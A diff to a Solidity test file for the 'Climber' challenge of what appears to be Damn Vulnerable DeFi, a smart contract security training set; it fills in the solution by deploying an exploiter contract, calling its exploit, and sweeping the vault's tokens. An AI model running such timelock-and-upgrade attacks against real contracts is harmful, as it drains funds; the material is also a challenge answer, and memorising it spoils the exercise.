@@ -7,6 +7,7 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {ClimberExploiter} from "../../src/climber/ClimberExploiter.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +86,18 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        // Deploy exploiter
+        ClimberExploiter exploiter = new ClimberExploiter{salt: bytes32(uint256(1))}(
+            address(timelock),
+            address(vault),
+            recovery
+        );
+
+        // Execute exploit
+        exploiter.exploit();
+
+        // Sweep funds using upgraded vault
+        ClimberVault(address(vault)).sweepFunds(address(token));
     }
 
     /**
